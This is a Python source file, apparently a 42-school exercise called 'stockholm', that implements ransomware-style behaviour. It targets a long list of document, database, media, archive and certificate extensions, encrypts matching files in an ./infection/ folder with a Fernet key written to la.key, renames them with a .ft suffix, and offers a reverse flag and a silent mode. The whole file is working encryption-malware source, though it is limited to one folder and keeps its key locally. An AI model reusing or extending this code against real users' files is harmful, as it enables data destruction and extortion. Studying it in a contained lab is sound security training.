# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: begarijo <begarijo@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/18 13:21:03 by begarijo          #+#    #+#              #
#    Updated: 2023/05/27 13:09:26 by begarijo         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import argparse, os
from cryptography.fernet import Fernet

EXT = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'
,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'
,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'
,'.vb','.pl','.dip','.dch','.sch','.brd','.jsp','.php','.asp','.rb','.java','.jar','.class','.sh','.mp3','.wav'
,'.swf','.fla','.wmv','.mpg','.vob','.mpeg','.asf','.avi','.mov','.mp4','.3gp','.mkv','.3g2','.flv','.wma','.mid'
,'.m3u','.m4u','.djvu','.svg','.ai','.psd','.nef','.tiff','.tif','.cgm','.raw','.gif','.png','.bmp','.jpg','.jpeg'
,'.vcd','.iso','.backup','.zip','.rar','.7z','.gz','.tgz','.tar','.bak','.tbk','.bz2','.PAQ','.ARC','.aes','.gpg'
,'.vmx','.vmdk','.vdi','.sldm','.sldx','.sti','.sxi','.602','.hwp','.snt','.onetoc2','.dwg','.pdf','.wk1','.wks'
,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']

KEY = 'la.key'
PATH = './infection/'
healthy_files = set()
sick_files = set()

def	arg_parser():
	arg = argparse.ArgumentParser()
	arg.add_argument("-v", "-version", help="Show the current program version.", action="store_true")
	arg.add_argument("-r", "-reverse", help="Reverse the infection using a key.", metavar="key")
	arg.add_argument("-s", "-silent", help="Don't print the results.", action="store_true")
	return arg.parse_args()

def   ft_generate_key():
	try:
		if not r:
			key_aux = Fernet.generate_key()
			with open(KEY, 'wb') as fern:
				fern.write(key_aux) 
			f = Fernet(key_aux)
		elif r:
			with open(KEY, 'rb') as fern:
				f = Fernet(fern.read())
		return f
	except:
		print("Error?")

def	open_file(file):
	try:
		with open(file, 'rb') as b_file:
			return (b_file.read())
	except:
		print("ERROR: File could not be opened.")

def   ft_decrypt(file):
	try:
		ext_file = os.path.splitext(file)[1]
		if ext_file == ".ft":
			h_file = change_ext(file)
			dec_file = f.decrypt(open_file(h_file))
			with open(h_file, 'wb') as healthy:
				healthy.write(dec_file)
			if h_file not in healthy_files:
				healthy_files.add(h_file)
		if not s:
			print("Decrypting " + h_file)
	except:
		if not s:
			print(file + " could not be decrypted.")

def	ft_encrypt(file):
	try:
		ext_file = os.path.splitext(file)[1]
		if ext_file in EXT:
			s_file = change_ext(file)
			enc_file = f.encrypt(open_file(s_file))
			with open(s_file, 'wb') as sick:
				sick.write(enc_file)
			if s_file not in sick_files:
				sick_files.add(s_file)
		if not s:
			print("Encrypting " + s_file)
	except:
		if not s:
			print(file + " could not be encrypted.")

def	change_ext(file):
	ext_file = os.path.splitext(file)[1]
	if r:
		if ext_file == ".ft":
			new_file = os.path.splitext(file)[0]
	else:
		if ext_file in EXT:
			new_file = file + ".ft"
	os.rename(file, new_file)
	return new_file

def	stockholm():
	if os.path.exists(PATH):
		for file in os.listdir(PATH):
			if r and os.path.splitext(file)[1] == ".ft":
				ft_decrypt(PATH + file)
			elif not r and os.path.splitext(file)[1] in EXT:
				ft_encrypt(PATH + file)
	else:
		print("ERROR: Path does not exist.")

if (__name__=='__main__'):
	global f, v, r, s
	arg = arg_parser()
	v = arg.v
	r = arg.r
	s = arg.s
	f = ft_generate_key()
	if v:
		print("Stockholm 1.1")
	else:
		stockholm()
